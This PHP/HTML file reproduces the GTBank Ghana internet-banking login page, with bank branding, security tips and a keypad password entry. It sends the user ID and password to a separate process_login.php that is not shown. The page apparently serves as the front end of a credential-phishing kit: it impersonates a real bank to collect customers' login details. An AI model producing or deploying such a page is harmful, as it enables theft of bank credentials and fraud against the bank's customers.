<?php
// Start session
session_start();

// Initialize error variable
$error_message = "";

// Check if there's an error message in the session
if (isset($_SESSION['login_error'])) {
    $error_message = $_SESSION['login_error'];
    // Clear the error message
    unset($_SESSION['login_error']);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8"/>
  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
  <title>GTBank Internet Banking</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      background-color: #f5f5f5;
    }
    .container {
      max-width: 1024px;
      margin: 0 auto;
    }
    .header {
      background-color: #d3d3d3;
      padding: 10px 20px;
      margin-bottom: 20px;
    }
    .header h1 {
      margin: 0;
      font-size: 24px;
      color: #444;
      font-weight: bold;
    }
    .logo {
      position: absolute;
      right: calc(50% - 490px);
      top: 20px;
    }
    .main-content {
      display: flex;
      background-color: white;
      padding: 20px;
      border: 1px solid #ddd;
      margin-bottom: 20px;
    }
    .login-form {
      width: 65%;
      padding-right: 20px;
    }
    .promo {
      width: 35%;
    }
    h2 {
      color: #444;
      font-size: 18px;
      margin-bottom: 10px;
    }
    .input-group {
      margin-bottom: 15px;
    }
    .input-group label {
      display: block;
      margin-bottom: 5px;
      color: #555;
    }
    .input-group input {
      width: 100%;
      padding: 8px;
      border: 1px solid #ccc;
    }
    .keypad {
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      gap: 8px;
      margin-bottom: 20px;
    }
    .keypad-btn {
      padding: 12px;
      text-align: center;
      background-color: #f0f0f0;
      border: 1px solid #ddd;
      cursor: pointer;
    }
    .clr-btn {
      background-color: #e74c3c;
      color: white;
    }
    .del-btn {
      background-color: #e74c3c;
      color: white;
    }
    .login-btn {
      background-color: #27ae60;
      color: white;
      padding: 15px;
    }
    .footer-links {
      display: flex;
      justify-content: space-between;
      margin-top: 10px;
      margin-bottom: 20px;
    }
    .footer-links a {
      color: #3498db;
      text-decoration: none;
      font-size: 14px;
    }
    .remember-me {
      display: flex;
      align-items: center;
    }
    .remember-me input {
      margin-right: 5px;
    }
    .info-boxes {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 20px;
      margin-bottom: 20px;
    }
    .info-box {
      background-color: white;
      border: 1px solid #ddd;
      padding: 15px;
      text-align: center;
    }
    .info-box h3 {
      margin: 10px 0;
      color: #444;
    }
    .info-box p {
      font-size: 14px;
      color: #666;
      margin-bottom: 10px;
    }
    .info-box a {
      display: inline-block;
      padding: 5px 10px;
      background-color: #666;
      color: white;
      text-decoration: none;
      border-radius: 3px;
      font-size: 12px;
    }
    .footer {
      background-color: #e74c3c;
      color: white;
      padding: 8px;
      text-align: center;
    }
    .footer a {
      color: white;
      text-decoration: none;
      margin: 0 10px;
      font-size: 12px;
    }
    .error-message {
      background-color: #f8d7da;
      color: #721c24;
      padding: 10px;
      margin-bottom: 15px;
      border: 1px solid #f5c6cb;
      border-radius: 4px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1>INTERNET BANKING</h1>
    </div>
    
    <img class="logo" src="images/logo.png" alt="GTBank logo" width="50px">
    
    <div class="main-content">
      <div class="login-form">
        <h2>Online Realtime Balances and Transactions</h2>
        <p>Please type your user ID and use the keypad to enter your password.</p>
        
        <?php if (!empty($error_message)): ?>
        <div class="error-message">
          <?php echo htmlspecialchars($error_message); ?>
        </div>
        <?php endif; ?>
        
        <form id="loginForm" method="post" action="process_login.php">
          <div class="input-group">
            <label for="userID">User ID:</label>
            <input type="text" id="userID" name="userID">
          </div>
          
          <div class="input-group">
            <label for="password">Password:</label>
            <input type="password" id="password" name="password" readonly>
          </div>
          
          <div class="keypad">
            <button type="button" class="keypad-btn numeric" data-value="9">9</button>
            <button type="button" class="keypad-btn numeric" data-value="8">8</button>
            <button type="button" class="keypad-btn numeric" data-value="7">7</button>
            <button type="button" class="keypad-btn clr-btn" id="clearBtn">CLR</button>
            
            <button type="button" class="keypad-btn numeric" data-value="6">6</button>
            <button type="button" class="keypad-btn numeric" data-value="5">5</button>
            <button type="button" class="keypad-btn numeric" data-value="4">4</button>
            <button type="button" class="keypad-btn del-btn" id="deleteBtn">DEL</button>
            
            <button type="button" class="keypad-btn numeric" data-value="3">3</button>
            <button type="button" class="keypad-btn numeric" data-value="2">2</button>
            <button type="button" class="keypad-btn numeric" data-value="1">1</button>
            <button type="button" class="keypad-btn numeric" data-value="0">0</button>
            
            <div></div>
            <div></div>
            <div></div>
            <button type="button" class="keypad-btn login-btn" id="loginBtn">Login</button>
          </div>
          
          <div class="footer-links">
            <a href="#">Forgot your password?</a>
            <a href="#">Forgot your secret question?</a>
          </div>
          
          <div class="remember-me">
            <input type="checkbox" id="remember" name="remember">
            <label for="remember">Remember My UserID</label>
          </div>
        </form>
      </div>
      
      <div class="promo">
        <img src="https://storage.googleapis.com/a1aa/image/EVLa1asV2g3fsalFVeuxF7fD550tOX731vz_k6DSi08.jpg" alt="GTBank Mobile App advertisement" width="100%">
      </div>
    </div>
    
    <div class="info-boxes">
      <div class="info-box">
        <img src="https://storage.googleapis.com/a1aa/image/U9gyf2toTbtvWiMzWSqhnj15f-SKxa-oyn8Eo55MUzo.jpg" alt="Security Tips icon" width="50">
        <h3>Security Tips</h3>
        <p>Please note that GTBank will NEVER ask you to provide your PIN (Personal Identification Numbers).</p>
        <a href="#">READ MORE</a>
      </div>
      
      <div class="info-box">
        <img src="https://storage.googleapis.com/a1aa/image/n07x5UI2Z5oVEaV_0SvMJsdXjXZElqGiHwWbaozYRYo.jpg" alt="Token icon" width="50">
        <h3>Do you have a token?</h3>
        <p>Get a Token today and begin to carry out third party transfers and online payments.</p>
        <a href="#">GET YOURS</a>
      </div>
      
      <div class="info-box">
        <img src="https://storage.googleapis.com/a1aa/image/xIw7GiwxzFCdOqk1xsAvGQBcqmtBmT1IyUiKNzGkio0.jpg" alt="Account Transfers icon" width="50">
        <h3>Account Transfers (Instant)</h3>
        <p>The fastest way to transfer money from your account to other bank accounts.</p>
        <a href="#">TRY IT TODAY</a>
      </div>
    </div>
    
    <div class="footer">
      <a href="#">GTBGHANA.COM</a> |
      <a href="#">TERMS & CONDITIONS</a> |
      <a href="#">WHISTLE BLOWER</a>
    </div>
  </div>

  <script>
    document.addEventListener('DOMContentLoaded', function() {
      // Get reference to the password input field
      const passwordInput = document.getElementById('password');
      
      // Handle numeric button clicks
      const numericButtons = document.querySelectorAll('.keypad-btn.numeric');
      numericButtons.forEach(button => {
        button.addEventListener('click', function() {
          const value = this.getAttribute('data-value');
          passwordInput.value += value;
        });
      });
      
      // Handle clear button click
      document.getElementById('clearBtn').addEventListener('click', function() {
        passwordInput.value = '';
      });
      
      // Handle delete button click
      document.getElementById('deleteBtn').addEventListener('click', function() {
        passwordInput.value = passwordInput.value.slice(0, -1);
      });
      
      // Handle login button click
      document.getElementById('loginBtn').addEventListener('click', function() {
        // Check if fields are filled
        const userID = document.getElementById('userID').value;
        if (!userID || !passwordInput.value) {
          alert('Please enter both User ID and Password');
          return;
        }
        
        // Submit the form
        document.getElementById('loginForm').submit();
      });
    });
  </script>
</body>
</html> 